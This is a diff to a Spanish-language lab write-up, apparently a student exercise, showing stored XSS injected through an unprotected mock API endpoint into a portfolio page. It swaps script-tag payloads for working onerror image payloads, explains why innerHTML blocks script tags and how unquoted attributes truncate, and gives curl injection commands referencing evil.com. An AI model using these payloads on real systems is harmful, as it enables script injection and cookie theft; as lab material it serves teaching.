@@ -77,12 +77,26 @@ y renderiza los datos tal cual. Todo funciona correctamente en este punto.
 **Objetivo:** Inyectar contenido malicioso en la API mock via su endpoint
 desprotegido `/update_repos`.
 
+> **IMPORTANTE (comportamiento del navegador):** un `<script>...</script>`
+> insertado mediante `innerHTML` **NO se ejecuta** — el estandar HTML5 lo impide
+> para nodos insertados dinamicamente. Para la demo en vivo se usa un payload con
+> manejador de evento (`<img src=x onerror=...>`), que **si** dispara. El
+> `<script>` clasico sirve para evidenciar la *propagacion* del payload, pero no
+> su *ejecucion*. Evidencia en [fase4_pruebas.md](fase4_pruebas.md) §4.4.
+>
+> **Cuidado con las comillas del atributo:** en un atributo HTML sin comillas, el
+> valor se corta en el primer espacio. Por eso `onerror=alert("XSS - Grupo 6")`
+> (con espacios y sin comillas) **NO dispara**. Usa `onerror=alert(document.domain)`
+> (sin espacios) para el one-liner de abajo, o si quieres un mensaje con espacios,
+> encierra el manejador en comillas: `onerror="alert('XSS - Grupo 6')"` y envialo
+> con un archivo (`-d @payload.json`) para no pelear con el escapado del shell.
+
 ```bash
 curl -s -X POST http://$VICTIMA:5000/update_repos \
   -H "Content-Type: application/json" \
   -d '[{
     "nombre": "repo-malicioso",
-    "descripcion": "<script>alert(\"XSS via API comprometida\")</script>",
+    "descripcion": "<img src=x onerror=alert(document.domain)>",
     "url": "https://evil.com/repo",
     "lenguaje": "JavaScript"
   }]' | python3 -m json.tool
@@ -96,7 +110,7 @@ curl -s -X POST http://$VICTIMA:5000/update_repos \
     "repos": [
         {
             "nombre": "repo-malicioso",
-            "descripcion": "<script>alert(\"XSS via API comprometida\")</script>",
+            "descripcion": "<img src=x onerror=alert(document.domain)>",
             "url": "https://evil.com/repo",
             "lenguaje": "JavaScript"
         }
@@ -135,7 +149,7 @@ curl -s http://$VICTIMA:8080/backend/ver_portafolio.php | python3 -m json.tool
     "repos": [
         {
             "nombre": "repo-malicioso",
-            "descripcion": "<script>alert(\"XSS via API comprometida\")</script>",
+            "descripcion": "<img src=x onerror=alert(document.domain)>",
             "url": "https://evil.com/repo",
             "lenguaje": "JavaScript"
         }
@@ -158,13 +172,15 @@ En ningun punto se valida ni sanitiza el campo `descripcion`.
 
 1. En el navegador de Kali, ir a `http://192.168.56.100:8080/`
 2. Hacer clic en **"Cargar Portafolio"**
-3. **Resultado:** Aparece un alert con el mensaje `"XSS via API comprometida"`
+3. **Resultado:** Salta un `alert()` mostrando el dominio de la victima (p. ej.
+   `192.168.56.100`). Es la prueba de que el JavaScript del atacante se ejecuto
+   dentro del contexto de la pagina de la victima (no en la del atacante).
 
 **Explicacion del flujo de ejecucion:**
 
 ```
 API mock (comprometida)
-  -> descripcion contiene <script>alert(...)</script>
+  -> descripcion contiene <img src=x onerror=alert(...)>
     -> ver_portafolio.php reenvia sin sanitizar
       -> script.js asigna repo.descripcion a innerHTML
         -> navegador parsea el HTML e ejecuta el <script>
@@ -193,14 +209,16 @@ curl -s -X POST http://$VICTIMA:5000/update_repos \
   -H "Content-Type: application/json" \
   -d '[{
     "nombre": "repo-img",
-    "descripcion": "<img src=x onerror=alert(\"XSS sin script tag\")>",
+    "descripcion": "<img src=x onerror=alert(document.domain)>",
     "url": "https://evil.com",
     "lenguaje": "HTML"
   }]'
 ```
 
 Recargar portafolio en el navegador. El alert se ejecuta via `onerror` sin
-usar la etiqueta `<script>`, evitando filtros basicos.
+usar la etiqueta `<script>`, evitando filtros basicos. (Se usa
+`alert(document.domain)` sin espacios: un atributo `onerror` sin comillas se
+cortaria en el primer espacio.)
 
 ### 5b. Robo de cookies (demostracion avanzada)
 
